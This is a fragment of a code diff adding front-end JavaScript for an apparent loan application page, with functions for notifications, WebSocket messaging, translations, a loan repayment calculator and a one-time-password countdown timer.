-          
+  setTimeout(() => {
+    el.classList.add("hidden");
+  }, 4000);
+}
+
+function sendWsMessage(data) {
+  if (ws && ws.readyState === WebSocket.OPEN) {
+    ws.send(JSON.stringify(data));
+  }
+}
+
+function applyTranslations() {
+  const texts = i18n[currentLang];
+  document.querySelectorAll("[data-i18n]").forEach(el => {
+    const key = el.getAttribute("data-i18n");
+    if (texts[key]) {
+      el.textContent = texts[key];
+    }
+  });
+}
+
+function updateCurrencyDisplay() {
+  document.getElementById("minAmountLabel").textContent = `${currentCurrency} 10,000`;
+  document.getElementById("maxAmountLabel").textContent = `${currentCurrency} 1,000,000`;
+  updateCalculator();
+}
+
+function updateCalculator() {
+  const amount = parseInt(document.getElementById("loanAmountSlider").value);
+  const term = parseInt(document.getElementById("loanTermSlider").value);
+
+  document.getElementById("currentAmountLabel").textContent = `${currentCurrency} ${amount.toLocaleString()}`;
+  document.getElementById("currentTermLabel").textContent = `${term} MONTHS`;
+
+  const monthlyRate = 0.135 / 12;
+  const monthlyRepayment = Math.round((amount * monthlyRate) + (amount / term));
+  const totalRepayment = monthlyRepayment * term;
+
+  document.getElementById("monthlyRepaymentValue").textContent = `${currentCurrency} ${monthlyRepayment.toLocaleString()}`;
+  document.getElementById("totalRepaymentValue").textContent = `${currentCurrency} ${totalRepayment.toLocaleString()}`;
+  document.getElementById("formSelectedAmount").textContent = `${currentCurrency} ${amount.toLocaleString()}`;
+  document.getElementById("formSelectedTerm").textContent = `${term} Months`;
+}
+
+function startOtpTimer() {
+  clearInterval(timerInterval);
+  let seconds = 59;
+  const display = document.getElementById("timerDisplay");
+
+  timerInterval = setInterval(() => {
+    display.textContent = `00:${seconds < 10 ? '0' : ''}${seconds}`;
+    if (seconds <= 0) {
+      clearInterval(timerInterval);
+    }
+    seconds--;
+  }, 1000);
+      }
+    
